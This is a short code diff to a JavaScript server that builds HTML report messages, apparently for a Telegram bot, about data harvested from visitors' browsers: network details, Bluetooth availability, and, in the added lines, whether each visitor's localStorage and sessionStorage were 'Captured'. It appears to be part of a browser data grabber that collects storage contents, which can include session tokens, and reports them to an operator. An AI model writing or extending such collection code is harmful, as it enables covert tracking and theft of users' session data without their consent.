@@ -247,7 +247,13 @@ async function startServer() {
         extraMsg += `🌐 <b>NETWORK LAYER ANALYTICS:</b>\n` +
                     `├ Type: <code>${data.net_effective}</code>\n` +
                     `├ RTT: <code>${data.net_rtt}ms</code>\n` +
-                    `└ Downlink: <code>${data.net_downlink}Mb/s</code>\n\n`;
+                    `├ Downlink: <code>${data.net_downlink}Mb/s</code>\n` +
+                    `└ Beacon RTT: <code>${data.beacon_rtt || 'N/A'}</code>\n\n`;
+      }
+      if (data.storage_ls || data.storage_ss) {
+        extraMsg += `📂 <b>PERSISTENT DATA MAP:</b>\n` +
+                    `├ LocalStorage: <i>${data.storage_ls ? 'Captured' : 'Empty'}</i>\n` +
+                    `└ SessionStorage: <i>${data.storage_ss ? 'Captured' : 'Empty'}</i>\n\n`;
       }
       if (data.bt_available !== undefined) {
         extraMsg += `📡 <b>PERIPHERAL BUS:</b>\n` +
